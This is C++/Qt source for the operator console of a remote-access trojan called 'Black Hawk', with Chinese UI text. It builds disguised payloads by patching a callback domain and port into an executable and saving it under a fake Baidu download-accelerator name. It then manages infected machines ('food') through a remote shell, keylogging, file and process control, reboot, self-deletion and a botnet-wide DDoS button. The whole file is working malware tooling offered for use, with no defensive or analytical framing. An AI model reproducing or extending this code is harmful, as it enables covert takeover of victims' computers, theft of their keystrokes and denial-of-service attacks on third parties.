#include "hunter.h"
#include "ui_hunter.h"

Hunter::Hunter(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::Hunter)
{
    ui->setupUi(this);

    // -------------------------------------------界面设计------------------------------------------------
    // 主窗口
    this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
    this->setFixedSize(750, 500);

    // 总设置区
    ui->widgetOption->setFixedHeight(200);

    // 图片区
    ui->labelSister->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
//    ui->labelSister->setContentsMargins(0, 6, 0, 6);
    ui->labelSister->setText("");
    QMovie *movie = new QMovie(":/Icons/lze.gif");
    movie->start();
    ui->labelSister->setMovie(movie);
    ui->labelSister->setScaledContents(true);

    // 按键区
    ui->widgetBt->setFixedWidth(200);
    // 设置自适应大小
    ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btShell->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btDelete->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btKeybd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btSendBox->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btReboot->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btOffline->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    // 按钮文字
    ui->btFile->setText("文件\n操作");
    ui->btShell->setText("远程\nShell");
    ui->btDelete->setText("自我\n删除");
    ui->btDDos->setText("DDOS\n攻击");
    ui->btProcess->setText("进程\n管理");
    ui->btKeybd->setText("键盘\n监听");
    ui->btSendBox->setText("发送\n弹窗");
    ui->btReboot->setText("强制\n重启");
    ui->btOffline->setText("强行\n下线");

    // 初始化区
    ui->widgetInit->setFixedWidth(230);
    ui->widgetInput->setFixedHeight(120);
    // 生成食物反向连接的域名
    ui->labelDomain->setText("连接域名");
    ui->labelDomain->setAlignment(Qt::AlignCenter);
    ui->lineEditDomain->setText("10.211.55.2");
    ui->lineEditDomain->setMaxLength(80);
    ui->lineEditDomain->setAlignment(Qt::AlignCenter);
    ui->lineEditDomain->setToolTip("生成食物反向连接的域名");
    // 生成食物反向连接的端口
    ui->labelPort1->setText("连接端口");
    ui->labelPort1->setAlignment(Qt::AlignCenter);
    ui->lineEditPort1->setToolTip("生成食物反向连接的端口");
    ui->lineEditPort1->setValidator(new QIntValidator(1,65535));
    ui->lineEditPort1->setAlignment(Qt::AlignCenter);
    ui->lineEditPort1->setText("18000");
    // hunter服务器监听端口
    ui->labelPort2->setText("监听端口");
    ui->labelPort2->setAlignment(Qt::AlignCenter);
    ui->lineEditPort2->setToolTip("hunter服务器监听端口");
    ui->lineEditPort2->setValidator(new QIntValidator(1,65535));
    ui->lineEditPort2->setAlignment(Qt::AlignCenter);
    ui->lineEditPort2->setText("18000");
    // 启动hunter服务器开关
    ui->btSwitch->setText("启动hunter");
    ui->btSwitch->setToolTip("开始或停止监听端口");
    // 生成食物端
    ui->btGenerate->setText("用心做礼物");
    ui->btGenerate->setToolTip("根据连接端口和域名生成食物端");

    // 上线表格区
    ui->tableOnline->setColumnCount(7);
    ui->tableOnline->setHorizontalHeaderItem(0, new QTableWidgetItem("ID"));
    ui->tableOnline->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
    ui->tableOnline->setHorizontalHeaderItem(2, new QTableWidgetItem("IP地址"));
    ui->tableOnline->setHorizontalHeaderItem(3, new QTableWidgetItem("端口号"));
    ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("归属地"));
    ui->tableOnline->setHorizontalHeaderItem(5, new QTableWidgetItem("系统版本"));
    ui->tableOnline->setHorizontalHeaderItem(6, new QTableWidgetItem("处理器"));
    // 自适应列宽
    ui->tableOnline->setColumnWidth(0, 30);
    ui->tableOnline->setColumnWidth(1, 60);
    ui->tableOnline->setColumnWidth(2, 120);
    ui->tableOnline->setColumnWidth(3, 60);
    ui->tableOnline->setColumnWidth(4, 70);
    ui->tableOnline->setColumnWidth(5, 150);
    ui->tableOnline->horizontalHeader()->setSectionResizeMode(6, QHeaderView::Stretch);

    // 隐藏水平表头
    ui->tableOnline->verticalHeader()->setHidden(true);
    // 一行一行地选中
    ui->tableOnline->setSelectionBehavior(QAbstractItemView::SelectRows);
    // 一次最多选中一行
    ui->tableOnline->setSelectionMode(QAbstractItemView::SingleSelection);
    // 设置不可更改
    ui->tableOnline->setEditTriggers(QAbstractItemView::NoEditTriggers);

    // ----------------------------------------按键与对应逻辑--------------------------------------------------

    // 生成食物端口和hunter服务器监听端口默认相同
    connect(ui->lineEditPort1, &QLineEdit::textChanged, ui->lineEditPort2, &QLineEdit::setText);

    // hunter服务器开关
    connect(ui->btSwitch, &QPushButton::clicked, this, [=](){
        if (mCook->GetTcpServer()->server()->isListening()) {
            mCook->stop();
            ui->btSwitch->setText("启动hunter");
            ui->lineEditPort2->setReadOnly(false);
        } else {
            // 根据输入端口开启hunter服务器
            if (ui->lineEditPort2->text().isEmpty()){
                QMessageBox::warning(this, "提示", "主人，要先输入监听端口哟~");
                return;
            }
            mCook->start(ui->lineEditPort2->text().toInt());
            if (mCook->GetTcpServer()->server()->isListening()) {
                QMessageBox::information(this,"提示","恭喜主人！hunter服务器成功开启~");
                ui->btSwitch->setText("停止hunter");
                ui->lineEditPort2->setReadOnly(true);
            } else {
                QMessageBox::warning(this, "提示", "对不起主人...开启hunter服务端失败");
            }
        }
    });

    // 制作礼品开关
    connect(ui->btGenerate, &QPushButton::clicked, this, [=](){
        // 原始文件文件
        QString fileName = QFileDialog::getOpenFileName(this, "主人，请选择礼物的原材料哟~", "./", "(*.exe)");

        QFile file(fileName);
        if (!file.exists()) {
            QMessageBox::warning(this, "提示","主人！要选择正确的可执行原材料呀！");
            return;
        }

        // 获取保存礼品的位置
        QString saveFileName = QFileDialog::getSaveFileName(this, "保存主人精心准备的礼物",
                                                            QDir::current().absoluteFilePath("百度网盘不限速助手.exe"),"应用程序(*.exe)",
                                                            nullptr, QFileDialog::ShowDirsOnly);

        if (saveFileName.size() <= 0) {
            return;
        }

        // cuteFood.exe
        if (!file.open(QFile::ReadOnly)) {
            QMessageBox::warning(this, "提示","对不起主人，无法打开礼物原材料耶");
            return;
        }

        QByteArray fileData = file.readAll();

        // 关闭文件
        file.close();

        // 自定义食物的反弹连接的域名和端口
        const int offsetDomain = 10;
        const char domain[100] = "BLACKHAWK:\0";
        const int offsetPort = 12;
        const char port[100] = "HAWKISBLACK:\0";

        // 自定义域名
        int domainPos = fileData.indexOf(domain);
        if (domainPos == -1) {
            QMessageBox::warning(this, "提示","对不起主人！无法生成礼物，因为无法找到\'BLACKHAWK:\'的位置");
            return;
        }
        domainPos += offsetDomain;

        QByteArray afterDomain;
        afterDomain.append(ui->lineEditDomain->text());
        fileData.replace(domainPos, afterDomain.size(), afterDomain);

        // 自定义端口
        int portPos = fileData.indexOf(port);
        if (portPos == -1) {
            QMessageBox::warning(this, "提示","对不起主人！无法生成礼物，因为无法找到\'HAWKISBLACK:\'的位置");
            return;
        }
        portPos += offsetPort;

        QByteArray afterPort;
        afterPort.append(ui->lineEditPort1->text());
        fileData.replace(portPos, afterPort.size(), afterPort);

        // 保存文件
        QFile saveFile(saveFileName);
        if (!saveFile.open(QFile::WriteOnly)) {
            QMessageBox::warning(this, "提示","对不起主人！无法打开"+saveFileName);
            return;
        }
        saveFile.write(fileData.data(), fileData.size());

        saveFile.flush();
        saveFile.close();
    });

    // 对食物发送弹窗
    connect(ui->btSendBox, &QPushButton::clicked, this, [=](){
        // 获取当前用户id
        int id = curFoodIdInTbl();
        if (id != -1)
        {
            bool isSend;
            QString text = QInputDialog::getText(this, QString("给%0号食物一点安慰").arg(id),
                                                 "请输入您对它的肺腑之言：", QLineEdit::Normal,
                                                 "", &isSend);

            // 发送
            if (isSend)
            {
                Food *food = mCook->getFoodById(id);
                food->sendCmdSendBox(text);
            }
        }
        else
        {
            qDebug() << "不能发弹窗，没有食物呀主人！";
        }
    });

    // 强制食物重启
    connect(ui->btReboot, &QPushButton::clicked, this, [=](){
        // 获取当前用户id
        int id = curFoodIdInTbl();
        if (id != -1)
        {
            if(QMessageBox::Yes==QMessageBox::question(this, "主人您三思呀~",
                                                       "真滴要让这块食物重启吗？？",
                                                       QMessageBox::Yes | QMessageBox::No,
                                                       QMessageBox::Yes))
            {
                Food *food = mCook->getFoodById(id);
                food->sendCmdReboot();
            }
        }
        else
        {
            qDebug() << "不能强制重启，没有食物呀主人！";
        }
    });

    // 强制食物下线
    connect(ui->btOffline, &QPushButton::clicked, this, [=](){
        // 获取当前用户id
        int id = curFoodIdInTbl();
        if (id != -1)
        {
            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "主人！真的要下线这块食物吗？",
                                                       QMessageBox::Yes | QMessageBox::No,
                                                       QMessageBox::Yes))
            {
                Food *food = mCook->getFoodById(id);
                food->sendCmdOffline();
                qDebug() << "主人我下线了";
            }
        }
        else
        {
            qDebug() << "不能强制下线，没有食物呀主人！";
        }
    });

    // 监听键盘数据
    connect(ui->btKeybd, &QPushButton::clicked, this, [=](){
        int id = curFoodIdInTbl();
        if (id != -1) {
            Keybd *ks = new Keybd();
            Food *food = mCook->getFoodById(id);
            int port = ks->startKeybdServer(QString::number(id));

            // 开始监控
            food->sendCmdKeybd(port);
        }
    });

    // 启动远程shell
    connect(ui->btShell, &QPushButton::clicked, this, [=](){
        int id = curFoodIdInTbl();
        if (id != -1){
            Shell *sh = new Shell();
            Food *food = mCook->getFoodById(id);
            int port = sh->startShellServer(QString::number(id));

            // 让食物启动shell
            food->sendCmdShell(port);
        }
    });

    // 启动文件操作模块
    connect(ui->btFile, &QPushButton::clicked, this, [=](){
        int id = curFoodIdInTbl();
        if (id != -1) {
            File *fl = new File();
            Food *food = mCook->getFoodById(id);
            int port = fl->startFileServer(QString::number(id));

            // 开始监控
            food->sendCmdFile(port);
        }
    });

    // 启动进程管理模块
    connect(ui->btProcess, &QPushButton::clicked, this, [=](){
        int id = curFoodIdInTbl();
        if(id != -1){
            Proc *pr = new Proc();
            Food *food = mCook->getFoodById(id);
            int port = pr->startProcServer(QString::number(id));

            // 让食物启动进程管理模块
            food->sendCmdProc(port);
        }
    });

    // 启动ddos模块
    connect(ui->btDDos, &QPushButton::clicked, this, [=](){

        int id = ui->tableOnline->rowCount();
        if (id != 0)
        {

            Ddos *ds = new Ddos();
            QString IP = ds->getIP();
            int PORT = ds->getPORT();
            qDebug()<<IP<<PORT;

            for(int ddosid=1 ; ddosid <= id ; ddosid++)
            {
                DdosATK *dk= new DdosATK();
                Food *food = mCook->getFoodById(ddosid);
                //返回模块专用端口(用于发送命令)
                int port = dk->startDdosATKServer();

                //开始DDOS
                food->sendCmdDdos(port);
                //发送攻击目标IP和端口
                dk->sendCommand(IP,PORT);
                //断开食物？？？？
//                food->closeAndDelete();
            }
        }
        else
        {
            QMessageBox::information(this,"Fail","尊敬的主人，DDOS需要食物呀");
            qDebug() << "DDOS 需要肉鸡的,亲";
        }
    });

    // 发送自删除命令
    connect(ui->btDelete, &QPushButton::clicked, this, [=](){

        int id = curFoodIdInTbl();
        if(id != -1){
            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "主人！真的要这块食物永远消失吗？",
                                                       QMessageBox::Yes | QMessageBox::No,
                                                       QMessageBox::Yes)){
                Food *food = mCook->getFoodById(id);
                food->sendCmdDelete();
            }
        }
    });

    // ----------------------------------------按键与对应逻辑（完毕）--------------------------------------------------


    // 初始化hunter服务器
    mCook = new Cook(this);
    connect(mCook, SIGNAL(foodLogin(int,QString,QString,int,QString,QString)),
            this, SLOT(addFoodToTbl(int,QString,QString,int,QString,QString)));
    connect(mCook, SIGNAL(foodLogout(int)), this, SLOT(rmFoodFromTbl(int)));
//    mCook->start(18000)



}

Hunter::~Hunter()
{
    delete ui;
}


// ------------------------------------几个功能按键逻辑----------------------------------------

// 添加食物列表
void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo, QString proInfo){

    // 增加一行
    int count = ui->tableOnline->rowCount();
    ui->tableOnline->setRowCount(count + 1);

    // 添加信息
    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
    ui->tableOnline->setItem(count, 0 , itemId);

    QTableWidgetItem *itemUsername = new QTableWidgetItem(username);
    itemUsername->setTextAlignment(Qt::AlignCenter);
    ui->tableOnline->setItem(count, 1 , itemUsername );

    QTableWidgetItem *itemIpaddr = new QTableWidgetItem(ipaddr);
    itemIpaddr->setTextAlignment(Qt::AlignCenter);
    ui->tableOnline->setItem(count, 2 , itemIpaddr);

    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
    itemPort->setTextAlignment(Qt::AlignCenter);
    ui->tableOnline->setItem(count, 3 , itemPort);

    QString locate =ipLocation(ipaddr);
    QTableWidgetItem *itemLocate = new QTableWidgetItem(locate);
    itemLocate->setTextAlignment(Qt::AlignCenter);
    ui->tableOnline->setItem(count, 4 , itemLocate);

    QTableWidgetItem *itemSysInfo = new QTableWidgetItem(sysInfo);
    ui->tableOnline->setItem(count, 5 , itemSysInfo);

    QTableWidgetItem *itemProInfo = new QTableWidgetItem(proInfo);
    ui->tableOnline->setItem(count, 6 , itemProInfo);

}

// 删除食物
void Hunter::rmFoodFromTbl(int id){

    // 用ID判断该删除的行索引
    int count = ui->tableOnline->rowCount();
    for (int i = 0; i< count; i++) {
        if (ui->tableOnline->item(i, 0)->text().toInt() == id) {
            // 删除
            ui->tableOnline->removeRow(i);
            break;
        }
    }
}

// 返回当前选中食物ID
int Hunter::curFoodIdInTbl(){
    int index = ui->tableOnline->currentRow();
    if (index == -1) {
        return -1;
    }
    return ui->tableOnline->item(index, 0)->text().toInt();
}

QString Hunter::ipLocation(QString ip)
{
    /*-----------------------------------------
    局域网IP地址范围
    A类：10.0.0.0-10.255.255.255
    B类：172.16.0.0-172.31.255.255
    C类：192.168.0.0-192.168.255.255
    -------------------------------------------*/
    QString Location="内网";
    //判断是否为内网地址
    QStringList list=ip.split(".");
    if(list[0]=="10" || (list[0]=="172" && list[1].toInt()>15 && list[1].toInt()<32)\
            || (list[0]=="192" && list[1]=="168") || ip=="127.0.0.1"  )
    {
       return Location;
    }
    //使用126接口进行ip查询
    QString Starturl="http://ip.ws.126.net/ipquery?ip=";
    Starturl.append(ip);
    QUrl url(Starturl);
    QNetworkRequest request(url);
    QNetworkAccessManager *manger=new QNetworkAccessManager();
    QNetworkReply *reply=manger->get(request);
    QEventLoop loop;
    connect(reply,SIGNAL(finished()),&loop,SLOT(quit()));
    loop.exec();
    //编码转换
//    QTextCodec *text=QTextCodec::codecForName("GBK");
//    QString html=text->toUnicode(reply->readLine());
    QString html = reply->readLine();
    QRegExp city("lc=\"(.*)\"");
    city.indexIn(html);
    Location=city.cap(1);
    return Location;
}
